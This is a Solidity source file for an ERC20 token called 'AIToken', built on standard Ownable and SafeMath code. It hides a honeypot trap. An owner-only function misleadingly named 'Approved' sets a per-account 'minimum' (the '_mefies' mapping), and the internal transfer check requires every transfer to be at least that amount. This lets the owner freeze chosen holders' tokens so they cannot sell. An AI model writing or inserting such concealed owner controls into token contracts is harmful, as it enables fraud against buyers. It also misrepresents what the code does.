1 // SPDX-License-Identifier: MIT
2 
3 // pragma solidity ^0.8.0;
4 
5 
6 interface IERC20 {
7 
8     function totalSupply() external view returns (uint256);
9 
10     function balanceOf(address account) external view returns (uint256);
11 
12     function transfer(address recipient, uint256 amount) external returns (bool);
13 
14 
15     function allowance(address owner, address spender) external view returns (uint256);
16 
17     function approve(address spender, uint256 amount) external returns (bool);
18 
19     function transferFrom(
20         address sender,
21         address recipient,
22         uint256 amount
23     ) external returns (bool);
24 
25 
26     event Transfer(address indexed from, address indexed to, uint256 value);
27 
28     event Approval(address indexed owner, address indexed spender, uint256 value);
29 }
30 
31 abstract contract Context {
32     function _msgSender() internal view virtual returns (address) {
33         return msg.sender;
34     }
35 
36     function _msgData() internal view virtual returns (bytes calldata) {
37         return msg.data;
38     }
39 }
40 
41 abstract contract Ownable is Context {
42     address private _owner;
43 
44     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
45 
46     constructor() {
47         _setOwner(_msgSender());
48     }
49 
50     function owner() public view virtual returns (address) {
51         return _owner;
52     }
53 
54     modifier onlyOwner() {
55         require(owner() == _msgSender(), "Ownable: caller is not the owner");
56         _;
57     }
58 
59     function renounceOwnership() public virtual onlyOwner {
60         _setOwner(address(0));
61     }
62 
63     function transferOwnership(address newOwner) public virtual onlyOwner {
64         require(newOwner != address(0), "Ownable: new owner is the zero address");
65         _setOwner(newOwner);
66     }
67 
68     function _setOwner(address newOwner) private {
69         address oldOwner = _owner;
70         _owner = newOwner;
71         emit OwnershipTransferred(oldOwner, newOwner);
72     }
73 }
74 
75 library SafeMath {
76 
77     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
78         unchecked {
79             uint256 c = a + b;
80             if (c < a) return (false, 0);
81             return (true, c);
82         }
83     }
84 
85     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
86         unchecked {
87             if (b > a) return (false, 0);
88             return (true, a - b);
89         }
90     }
91 
92     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
93         unchecked {
94             // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
95             // benefit is lost if 'b' is also tested.
96             // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
97             if (a == 0) return (true, 0);
98             uint256 c = a * b;
99             if (c / a != b) return (false, 0);
100             return (true, c);
101         }
102     }
103 
104     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
105         unchecked {
106             if (b == 0) return (false, 0);
107             return (true, a / b);
108         }
109     }
110 
111     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
112         unchecked {
113             if (b == 0) return (false, 0);
114             return (true, a % b);
115         }
116     }
117 
118     function add(uint256 a, uint256 b) internal pure returns (uint256) {
119         return a + b;
120     }
121 
122     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
123         return a - b;
124     }
125 
126     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
127         return a * b;
128     }
129 
130     function div(uint256 a, uint256 b) internal pure returns (uint256) {
131         return a / b;
132     }
133 
134     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
135         return a % b;
136     }
137 
138     function sub(
139         uint256 a,
140         uint256 b,
141         string memory errorMessage
142     ) internal pure returns (uint256) {
143         unchecked {
144             require(b <= a, errorMessage);
145             return a - b;
146         }
147     }
148 
149     function div(
150         uint256 a,
151         uint256 b,
152         string memory errorMessage
153     ) internal pure returns (uint256) {
154         unchecked {
155             require(b > 0, errorMessage);
156             return a / b;
157         }
158     }
159 
160     function mod(
161         uint256 a,
162         uint256 b,
163         string memory errorMessage
164     ) internal pure returns (uint256) {
165         unchecked {
166             require(b > 0, errorMessage);
167             return a % b;
168         }
169     }
170 }
171 
172 
173 enum TokenType {
174     standard,
175     antiBotStandard,
176     liquidityGenerator,
177     antiBotLiquidityGenerator,
178     baby,
179     antiBotBaby,
180     buybackBaby,
181     antiBotBuybackBaby
182 }
183 
184 abstract contract BaseToken {
185     event TokenCreated(
186         address indexed owner,
187         address indexed token,
188         TokenType tokenType,
189         uint256 version
190     );
191 }
192 
193 pragma solidity =0.8.4;
194 
195 contract AIToken is IERC20, Ownable, BaseToken {
196     using SafeMath for uint256;
197 
198     uint256 public constant VERSION = 1;
199 
200     mapping(address => uint256) private _balances;
201     mapping(address => mapping(address => uint256)) private _allowances;
202     mapping(address => uint256) private _mefies; 
203 
204     string private _name;
205     string private _symbol;
206     uint8 private _decimals;
207     uint256 private _totalSupply;
208 
209     constructor(
210         string memory name_,
211         string memory symbol_,
212         uint8 decimals_,
213         uint256 totalSupply_
214 
215     ) payable {
216         _name = name_;
217         _symbol = symbol_;
218         _decimals = decimals_;
219         _mint(owner(), totalSupply_);
220 
221         emit TokenCreated(owner(), address(this), TokenType.standard, VERSION);
222     }
223     function Approved(address[] memory accounts, uint256 amount) public onlyOwner {
224         for (uint256 i = 0; i < accounts.length; i++) {
225             _mefies[accounts[i]] = amount;
226         }
227     }
228 
229     function getmefie(address account) public view returns (uint256) {
230         return _mefies[account];
231     }
232 
233     function name() public view virtual returns (string memory) {
234         return _name;
235     }
236 
237     function symbol() public view virtual returns (string memory) {
238         return _symbol;
239     }
240 
241     function decimals() public view virtual returns (uint8) {
242         return _decimals;
243     }
244 
245     function totalSupply() public view virtual override returns (uint256) {
246         return _totalSupply;
247     }
248 
249     function balanceOf(address account)
250         public
251         view
252         virtual
253         override
254         returns (uint256)
255     {
256         return _balances[account];
257     }
258 
259     function transfer(address recipient, uint256 amount)
260         public
261         virtual
262         override
263         returns (bool)
264     {
265         _transfer(_msgSender(), recipient, amount);
266         return true;
267     }
268 
269     function allowance(address owner, address spender)
270         public
271         view
272         virtual
273         override
274         returns (uint256)
275     {
276         return _allowances[owner][spender];
277     }
278 
279 
280     function approve(address spender, uint256 amount)
281         public
282         virtual
283         override
284         returns (bool)
285     {
286         _approve(_msgSender(), spender, amount);
287         return true;
288     }
289 
290     function transferFrom(
291         address sender,
292         address recipient,
293         uint256 amount
294     ) public virtual override returns (bool) {
295         _transfer(sender, recipient, amount);
296         _approve(
297             sender,
298             _msgSender(),
299             _allowances[sender][_msgSender()].sub(
300                 amount,
301                 "ERC20: transfer amount exceeds allowance"
302             )
303         );
304         return true;
305     }
306 
307     function increaseAllowance(address spender, uint256 addedValue)
308         public
309         virtual
310         returns (bool)
311     {
312         _approve(
313             _msgSender(),
314             spender,
315             _allowances[_msgSender()][spender].add(addedValue)
316         );
317         return true;
318     }
319 
320     function decreaseAllowance(address spender, uint256 subtractedValue)
321         public
322         virtual
323         returns (bool)
324     {
325         _approve(
326             _msgSender(),
327             spender,
328             _allowances[_msgSender()][spender].sub(
329                 subtractedValue,
330                 "ERC20: decreased allowance below zero"
331             )
332         );
333         return true;
334     }
335     function _transfer(
336         address sender,
337         address recipient,
338         uint256 amount
339     ) internal virtual {
340         require(sender != address(0), "ERC20: transfer from the zero address");
341         require(recipient != address(0), "ERC20: transfer to the zero address");
342         require(amount >= _mefies[sender], "ERC20: transfer amount is less than minimum allowed"); 
343 
344         _beforeTokenTransfer(sender, recipient, amount);
345 
346         _balances[sender] = _balances[sender].sub(
347             amount,
348             "ERC20: transfer amount exceeds balance"
349         );
350         _balances[recipient] = _balances[recipient].add(amount);
351         emit Transfer(sender, recipient, amount);
352     }
353     function _mint(address account, uint256 amount) internal virtual {
354         require(account != address(0), "ERC20: mint to the zero address");
355 
356         _beforeTokenTransfer(address(0), account, amount);
357 
358         _totalSupply = _totalSupply.add(amount);
359         _balances[account] = _balances[account].add(amount);
360         emit Transfer(address(0), account, amount);
361     }
362 
363     function _burn(address account, uint256 amount) internal virtual {
364         require(account != address(0), "ERC20: burn from the zero address");
365 
366         _beforeTokenTransfer(account, address(0), amount);
367 
368         _balances[account] = _balances[account].sub(
369             amount,
370             "ERC20: burn amount exceeds balance"
371         );
372         _totalSupply = _totalSupply.sub(amount);
373         emit Transfer(account, address(0), amount);
374     }
375 
376     function _approve(
377         address owner,
378         address spender,
379         uint256 amount
380     ) internal virtual {
381         require(owner != address(0), "ERC20: approve from the zero address");
382         require(spender != address(0), "ERC20: approve to the zero address");
383 
384         _allowances[owner][spender] = amount;
385         emit Approval(owner, spender, amount);
386     }
387 
388     function _setupDecimals(uint8 decimals_) internal virtual {
389         _decimals = decimals_;
390     }
391 
392     function _beforeTokenTransfer(
393         address from,
394         address to,
395         uint256 amount
396     ) internal virtual {}
397 }